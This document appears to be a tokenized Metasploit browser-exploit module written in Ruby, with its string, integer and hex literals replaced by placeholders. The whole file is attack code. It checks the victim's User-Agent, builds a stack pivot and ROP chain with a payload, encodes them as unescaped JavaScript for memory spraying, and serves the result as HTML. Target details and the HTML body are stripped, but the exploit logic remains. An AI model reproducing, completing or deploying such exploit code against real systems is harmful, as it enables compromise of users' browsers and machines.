require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: RopDb def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > true } , <str> = > { <str> = > <str> , <str> = > true , <str> = > <int> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] ] , <str> = > <str> , <str> = > <int> ) ) end def stack_pivot pivot = <str> pivot << <str> pivot << <str> pivot << <str> return pivot end def junk ( n = <int> ) return rand_text_alpha ( n ) . unpack ( <str> ) . first end def on_request_uri ( cli , request ) agent = request . headers [ <str> ] vprint_status ( <str> agent <str> ) if agent !~ <str> print_error ( <str> agent <str> ) send_not_found ( cli ) return end unless agent =~ <str> print_error ( <str> agent <str> ) send_not_found ( cli ) return end code = [ target [ <str> ] , target [ <str> ] , target [ <str> ] , target [ <str> ] , target [ <str> ] , target [ <str> ] , <hex> , ] . pack ( <str> ) code << [ target [ <str> ] ] . pack ( <str> ) * <int> code << [ target [ <str> ] ] . pack ( <str> ) code << [ target [ <str> ] ] . pack ( <str> ) code << generate_rop_payload ( <str> , stack_pivot + payload . encoded , { <str> = > <str> } ) js_code = Rex :: Text . to_unescape ( code , Rex :: Arch . endian ( target . arch ) ) js_random = Rex :: Text . to_unescape ( rand_text_alpha ( <int> ) , Rex :: Arch . endian ( target . arch ) ) js_ptr = Rex :: Text . to_unescape ( [ target [ <str> ] ] . pack ( <str> ) , Rex :: Arch . endian ( target . arch ) ) content = <<- <str> HTML <str> <str> HTML print_status ( <str> request . uri <str> ) print_status ( <str> ) send_response ( cli , content , { <str> = > <str> } ) end end 
